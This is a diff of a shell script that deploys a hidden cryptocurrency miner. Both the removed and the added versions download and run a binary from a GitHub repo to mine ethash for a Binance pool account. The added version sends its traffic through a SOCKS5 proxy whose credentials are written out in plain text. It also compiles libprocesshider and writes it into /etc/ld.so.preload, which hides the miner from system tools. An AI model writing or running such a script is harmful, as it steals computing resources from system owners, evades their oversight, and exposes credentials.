@@ -1,19 +1,43 @@
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
-npm i -g node-process-hider
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
-chmod +x Transport
-ph add Transport
-sleep 9
-ph add Transport
-sleep 9
-ph add Transport
-sleep 9
-ph add Transport
-sleep 9
-ph add Transport
-sleep 30
-sudo ./Transport -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u teguhcong -p x -w Trans --no-sni  --proxy 51.75.77.193:1081 --dns-https-server 1.1.1.1
+#!/bin/sh
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 45.136.231.85:7141
+socks5_username = hkakapne
+socks5_password = tjgytqqct5xo
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./bezzHash --url=teguhcong.$(echo $(shuf -i 1-99999 -n 1)-Ayolah)@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
